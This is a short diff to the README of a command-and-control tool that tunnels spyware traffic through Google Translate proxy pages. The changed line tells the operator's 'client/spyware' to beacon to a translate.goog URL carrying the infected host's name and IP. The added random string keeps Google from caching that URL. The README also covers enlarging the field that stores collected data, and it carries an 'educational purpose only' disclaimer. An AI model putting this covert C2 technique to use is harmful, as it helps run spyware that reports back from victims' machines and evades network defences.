@@ -22,6 +22,7 @@ A simple C2 meant to be used behind Google Translate Webpages as a proxy for dat
 You can expand the size of the data by editing ``collector\models.py`` and edit the ``max_length=<your value>`` for the ``data_content`` field.
 
 ### Sending command
-- Fetch the following link from your client/spyware: ``https://your-domain.translate.goog/c/<hostname>/<ip>/``
+- Fetch the following link from your client/spyware: ``https://your-domain.translate.goog/c/<hostname>/<ip>/<random_string>``
+  - The random string is used to prevent Google to cache the URL.
 
 # FOR EDUCATIONAL PURPOSE ONLY
